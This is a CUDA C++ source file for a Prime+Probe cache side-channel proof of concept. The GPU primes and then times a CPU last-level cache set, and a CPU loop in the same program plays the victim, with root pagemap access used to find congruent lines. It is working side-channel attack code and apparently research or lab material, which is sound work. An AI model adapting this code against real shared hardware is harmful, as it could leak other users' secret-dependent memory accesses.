/*
 * prime_probe_gpu.cu
 *
 * TRUE Prime+Probe side-channel attack
 * Attacker = GPU  (primes LLC set, then probes reload timing)
 * Victim   = CPU  (accesses "secret" data mapping to same LLC set)
 *
 * Phase 1 — PRIME:  GPU fills all ways of target LLC set via congruent lines
 * Phase 2 — VICTIM: CPU accesses its data (same LLC set) → evicts GPU lines
 * Phase 3 — PROBE:  GPU re-accesses lines with clock64() timing
 *                   Slow line = CPU victim evicted it from LLC
 *                   → GPU learns which lines CPU accessed (side channel)
 *
 * Runs two modes per trial:
 *   victim_active  — CPU accesses congruent lines between prime and probe
 *   victim_silent  — CPU does nothing between prime and probe
 * Comparing probe timings reveals the CPU's access pattern.
 *
 * Usage:
 *   sudo ./prime_probe_gpu <target_set> <trials> <cache_kb> <ways>
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <algorithm>
#include <string>
#include <vector>
#include <cuda_runtime.h>
#include "timing_utils.h"

#define ARRAY_SIZE      (16 * 1024 * 1024)  // 64MB managed array
#define CACHELINE_INTS  16
#define MAX_CONGRUENT   8192

// GPU L2 flush buffer — must exceed GPU L2 size to evict prime lines
// RTX 3060 L2 = 2.25MB → use 8MB (2M ints)
// A30 L2 = 6MB → use 16MB (4M ints)  — change if needed
#define FLUSH_INTS      (2 * 1024 * 1024)

// ── GPU Kernels ───────────────────────────────────────────────

// PRIME: GPU fills all ways of the target LLC set
// Each thread accesses stride-separated congruent lines
__global__ void prime_kernel(volatile int* data, const int* idx, int n) {
    int tid   = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    // Multiple passes to ensure all ways are filled
    for (int pass = 0; pass < 4; pass++)
        for (int j = tid; j < n; j += stride) {
            volatile int v = data[idx[j]];
            (void)v;
        }
}

// FLUSH GPU L2: thrash a large GPU-only buffer to evict prime lines
// from GPU L2 so probe is forced to fetch from CPU LLC (or DRAM)
__global__ void flush_gpu_l2(int* buf, int n) {
    int tid   = blockIdx.x * blockDim.x + threadIdx.x;
    int stride = blockDim.x * gridDim.x;
    for (int i = tid; i < n; i += stride)
        buf[i] = buf[i] ^ 1;   // read-modify-write to dirty all lines
}

// PROBE: GPU serially re-accesses each congruent line and times it
// Single thread for clean per-line timing (no inter-thread interference)
// Slow access → line was evicted from CPU LLC by the CPU victim
__global__ void probe_kernel(volatile int* data, const int* idx, int n,
                              uint64_t* timings) {
    if (threadIdx.x != 0 || blockIdx.x != 0) return;
    for (int i = 0; i < n; i++) {
        __threadfence_system();          // ensure ordering
        uint64_t t0 = clock64();
        volatile int v = data[idx[i]];  // probe this line
        __threadfence_system();
        uint64_t t1 = clock64();
        timings[i] = t1 - t0;
        (void)v;
    }
}

// ── Stats helper ──────────────────────────────────────────────
static uint64_t median_val(std::vector<uint64_t>& v) {
    std::sort(v.begin(), v.end());
    return v[v.size() / 2];
}

// ── Main ──────────────────────────────────────────────────────
int main(int argc, char** argv) {
    int target_set = (argc > 1) ? atoi(argv[1]) : 0;
    int trials     = (argc > 2) ? atoi(argv[2]) : 100;
    int cache_kb   = (argc > 3) ? atoi(argv[3]) : 12288;
    int ways       = (argc > 4) ? atoi(argv[4]) : 16;

    printf("=== TRUE PRIME+PROBE (GPU attacker, CPU victim) ===\n");
    printf("Target LLC set: %d  |  Trials: %d  |  LLC: %dKB/%d-way\n\n",
           target_set, trials, cache_kb, ways);

    // ── Allocate managed array (prime + probe data) ──
    int* data = nullptr;
    cudaMallocManaged(&data, ARRAY_SIZE * sizeof(int));
    for (int i = 0; i < ARRAY_SIZE; i++) data[i] = i;
    // Keep pages on CPU side (GPU accesses go through CPU LLC)
    cudaMemPrefetchAsync(data, ARRAY_SIZE * sizeof(int), cudaCpuDeviceId);
    cudaDeviceSynchronize();

    // ── Find congruent indices via pagemap (needs root) ──
    printf("[Setup] Scanning for congruent lines (set %d)...\n", target_set);
    std::vector<int> cong;
    for (int i = 0; i < ARRAY_SIZE; i += CACHELINE_INTS) {
        uint64_t pa = 0;
        if (virtual_to_physical((void*)&data[i], &pa) != 0) continue;
        uint64_t set = get_cache_set_index_from_phys(pa, cache_kb, ways);
        if ((int)set == target_set) {
            cong.push_back(i);
            if ((int)cong.size() >= MAX_CONGRUENT) break;
        }
    }
    if ((int)cong.size() < ways) {
        fprintf(stderr, "Not enough congruent lines: %d (need %d)\n",
                (int)cong.size(), ways);
        cudaFree(data); return 1;
    }
    int n = std::min((int)cong.size(), ways * 2);  // use 2x ways for solid prime
    printf("[Setup] Found %d congruent lines, using %d\n\n", (int)cong.size(), n);

    // Copy congruent indices to managed memory (GPU accessible)
    int* idx_dev = nullptr;
    cudaMallocManaged(&idx_dev, n * sizeof(int));
    for (int i = 0; i < n; i++) idx_dev[i] = cong[i];
    cudaMemPrefetchAsync(idx_dev, n * sizeof(int), 0);
    cudaDeviceSynchronize();

    // ── GPU-only flush buffer (for L2 eviction between prime and probe) ──
    int* flush_buf = nullptr;
    cudaMalloc(&flush_buf, FLUSH_INTS * sizeof(int));
    cudaMemset(flush_buf, 0, FLUSH_INTS * sizeof(int));

    // ── Probe timings output (managed so CPU can read after kernel) ──
    uint64_t* timings = nullptr;
    cudaMallocManaged(&timings, n * sizeof(uint64_t));

    // ── Output CSV ──
    char csv_path[256];
    snprintf(csv_path, sizeof(csv_path),
             "results/prime_probe_set%d.csv", target_set);
    FILE* fp = fopen(csv_path, "w");
    if (!fp) { perror("fopen"); return 1; }
    fprintf(fp, "trial,line_idx,array_offset,victim_mode,probe_cycles\n");

    printf("%-8s %-14s %-14s %-10s %-10s\n",
           "Trial", "Active_median", "Silent_median", "Ratio", "Detected");
    printf("%s\n", std::string(60, '-').c_str());

    int detected = 0;

    for (int t = 0; t < trials; t++) {
        uint64_t active_med, silent_med;

        // ════════════════════════════════════════════
        // MODE A: victim ACTIVE
        // ════════════════════════════════════════════

        // PRIME: GPU fills LLC set
        prime_kernel<<<8, 256>>>(data, idx_dev, n);
        cudaDeviceSynchronize();

        // FLUSH GPU L2: evict prime lines from GPU's own cache
        flush_gpu_l2<<<16, 256>>>(flush_buf, FLUSH_INTS);
        cudaDeviceSynchronize();

        // VICTIM (CPU active): access all congruent lines
        // Simulates CPU process touching same LLC set → evicts GPU's primed lines
        for (int i = 0; i < n; i++) {
            volatile int v = data[cong[i]];
            (void)v;
        }
        // Small delay to ensure CPU accesses retire
        cpu_barrier();

        // PROBE: GPU measures reload time per line
        probe_kernel<<<1, 1>>>(data, idx_dev, n, timings);
        cudaDeviceSynchronize();

        // Collect active timings
        std::vector<uint64_t> active_t(timings, timings + n);
        active_med = median_val(active_t);
        for (int i = 0; i < n; i++)
            fprintf(fp, "%d,%d,%d,active,%llu\n",
                    t, i, cong[i], (unsigned long long)timings[i]);

        // ════════════════════════════════════════════
        // MODE B: victim SILENT
        // ════════════════════════════════════════════

        // PRIME again
        prime_kernel<<<8, 256>>>(data, idx_dev, n);
        cudaDeviceSynchronize();

        // FLUSH GPU L2 again
        flush_gpu_l2<<<16, 256>>>(flush_buf, FLUSH_INTS);
        cudaDeviceSynchronize();

        // VICTIM (CPU silent): do nothing — just a small delay
        usleep(100);

        // PROBE
        probe_kernel<<<1, 1>>>(data, idx_dev, n, timings);
        cudaDeviceSynchronize();

        std::vector<uint64_t> silent_t(timings, timings + n);
        silent_med = median_val(silent_t);
        for (int i = 0; i < n; i++)
            fprintf(fp, "%d,%d,%d,silent,%llu\n",
                    t, i, cong[i], (unsigned long long)timings[i]);

        // ── Detection: active should be slower than silent ──
        bool det = (active_med > silent_med * 2);
        if (det) detected++;
        printf("%-8d %-14llu %-14llu %-10.2f %s\n",
               t + 1,
               (unsigned long long)active_med,
               (unsigned long long)silent_med,
               silent_med > 0 ? (double)active_med / silent_med : 0.0,
               det ? "YES ✓" : "no");
    }

    fclose(fp);
    printf("%s\n", std::string(60, '-').c_str());
    printf("Detection rate: %d/%d trials (%.1f%%)\n",
           detected, trials, 100.0 * detected / trials);
    printf("Saved: %s\n", csv_path);

    cudaFree(idx_dev);
    cudaFree(flush_buf);
    cudaFree(timings);
    cudaFree(data);
    return 0;
}
